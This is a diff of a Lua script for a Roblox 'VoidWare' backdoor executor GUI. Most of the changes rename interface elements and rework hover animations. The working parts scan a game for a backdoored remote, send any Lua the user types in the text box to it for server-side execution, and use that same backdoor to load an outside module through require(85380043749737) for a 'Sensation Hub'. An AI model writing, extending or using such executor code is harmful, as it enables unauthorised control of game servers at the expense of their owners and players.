+    buttonClickEffect(G2L["Scan_b"])
     
     spawn(function()
         if not findRemote() then
-            TextButton2_4.Text = "Scan for backdoor"
-            TextButton2_4.TextColor3 = Color3.fromRGB(138, 0, 255)
+            G2L["Scan_b"].Text = "Scan for backdoors"
+            G2L["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 255)
         end
     end)
 end)
 
-Exe_5.MouseButton1Click:Connect(function()
-    local scriptText = TextBox_f.Text
+G2L["Exe_28"].MouseButton1Click:Connect(function()
+    local scriptText = G2L["TextBox_32"].Text
     if backdoor and scriptText ~= "" then
         runRemote(backdoor, scriptText)
-        Exe_5.Text = "Executed!"
-        buttonClickEffect(Exe_5)
+        G2L["Exe_28"].Text = "Executed!"
+        buttonClickEffect(G2L["Exe_28"])
         task.wait(0.5)
-        Exe_5.Text = "Execute"
+        G2L["Exe_28"].Text = "Execute"
     else
-        Exe_5.Text = "No script!"
-        buttonClickEffect(Exe_5)
+        G2L["Exe_28"].Text = "No script!"
+        buttonClickEffect(G2L["Exe_28"])
         task.wait(0.5)
-        Exe_5.Text = "Execute"
+        G2L["Exe_28"].Text = "Execute"
     end
 end)
 
-Clear_3.MouseButton1Click:Connect(function()
-    TextBox_f.Text = ""
-    Clear_3.Text = "Cleared!"
-    buttonClickEffect(Clear_3)
+G2L["Clr_25"].MouseButton1Click:Connect(function()
+    G2L["TextBox_32"].Text = ""
+    G2L["Clr_25"].Text = "Cleared!"
+    buttonClickEffect(G2L["Clr_25"])
     task.wait(0.5)
-    Clear_3.Text = "Clear"
+    G2L["Clr_25"].Text = "Clear"
 end)
 
-Sens_d.MouseButton1Click:Connect(function()
+G2L["Sens_17"].MouseButton1Click:Connect(function()
     if backdoor then
         local playerName = Players.LocalPlayer.Name
-        runRemote(backdoor, "require(85380043749737)('"..player.Name.."', ColorSequence.new(Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 0, 0)), \"Standard\")")
-        Sens_d.Text = "Loaded!"
-        buttonClickEffect(Sens_d)
+        runRemote(backdoor, "require(85380043749737)('"..playerName.."', ColorSequence.new(Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 0, 0)), \"Standard\")")
+        G2L["Sens_17"].Text = "Loaded!"
+        buttonClickEffect(G2L["Sens_17"])
         task.wait(0.5)
-        Sens_d.Text = "Sensation Hub"
+        G2L["Sens_17"].Text = "Sensation Hub"
     end
 end)
 
-TextButton_8.MouseButton1Click:Connect(function()
-    createTween(VoidWare_2, {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
+G2L["Close_3"].MouseButton1Click:Connect(function()
+    createTween(G2L["Frame_2"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
     task.wait(0.3)
-    scanningGUI:Destroy()
+    G2L["ScreenGui_1"]:Destroy()
 end)
 
-TextButton_8b.MouseButton1Click:Connect(function()
-    createTween(VoidWareExecutor_2, {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
+G2L["Close_15"].MouseButton1Click:Connect(function()
+    createTween(G2L["Frame_14"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
     task.wait(0.3)
-    executorGUI:Destroy()
+    G2L["ScreenGui_13"]:Destroy()
 end)
 
-TextBox_f.Focused:Connect(function()
-    createTween(TextBox_f, {BackgroundColor3 = Color3.fromRGB(25, 25, 25)}, 0.2)
+local function setupHoverEffects(button)
+    button.MouseEnter:Connect(function()
+        createTween(button, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
+    end)
+    button.MouseLeave:Connect(function()
+        createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
+    end)
+end
+
+setupHoverEffects(G2L["Scan_b"])
+setupHoverEffects(G2L["Exe_28"])
+setupHoverEffects(G2L["Clr_25"])
+setupHoverEffects(G2L["Sens_17"])
+
+G2L["Close_3"].MouseEnter:Connect(function()
+    createTween(G2L["Close_3"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
+end)
+G2L["Close_3"].MouseLeave:Connect(function()
+    createTween(G2L["Close_3"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
 end)
 
-TextBox_f.FocusLost:Connect(function()
-    createTween(TextBox_f, {BackgroundColor3 = Color3.fromRGB(19, 19, 19)}, 0.2)
+G2L["Close_15"].MouseEnter:Connect(function()
+    createTween(G2L["Close_15"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
+end)
+G2L["Close_15"].MouseLeave:Connect(function()
+    createTween(G2L["Close_15"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
 end)
 
-TextButton2_4.MouseEnter:Connect(function()
-    createTween(TextButton2_4, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
+G2L["TextBox_32"].Focused:Connect(function()
+    createTween(G2L["TextBox_32"], {BackgroundTransparency = 0.4}, 0.2)
 end)
 
-TextButton2_4.MouseLeave:Connect(function()
-    createTween(TextButton2_4, {BackgroundColor3 = Color3.fromRGB(24, 24, 24)}, 0.2)
+G2L["TextBox_32"].FocusLost:Connect(function()
+    createTween(G2L["TextBox_32"], {BackgroundTransparency = 0.6}, 0.2)
 end)
 
-Exe_5.MouseEnter:Connect(function()
-    createTween(Exe_5, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
-end)
-
-Exe_5.MouseLeave:Connect(function()
-    createTween(Exe_5, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
-end)
-
-Clear_3.MouseEnter:Connect(function()
-    createTween(Clear_3, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
-end)
-
-Clear_3.MouseLeave:Connect(function()
-    createTween(Clear_3, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
-end)
-
-Sens_d.MouseEnter:Connect(function()
-    createTween(Sens_d, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
-end)
-
-Sens_d.MouseLeave:Connect(function()
-    createTween(Sens_d, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
-end)
-
-TextButton_8.MouseEnter:Connect(function()
-    createTween(TextButton_8, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
-end)
-
-TextButton_8.MouseLeave:Connect(function()
-    createTween(TextButton_8, {BackgroundColor3 = Color3.fromRGB(48, 48, 48)}, 0.2)
-end)
-
-TextButton_8b.MouseEnter:Connect(function()
-    createTween(TextButton_8b, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
-end)
-
-TextButton_8b.MouseLeave:Connect(function()
-    createTween(TextButton_8b, {BackgroundColor3 = Color3.fromRGB(48, 48, 48)}, 0.2)
-end)
-
-return scanningGUI
+return G2L["ScreenGui_1"], require
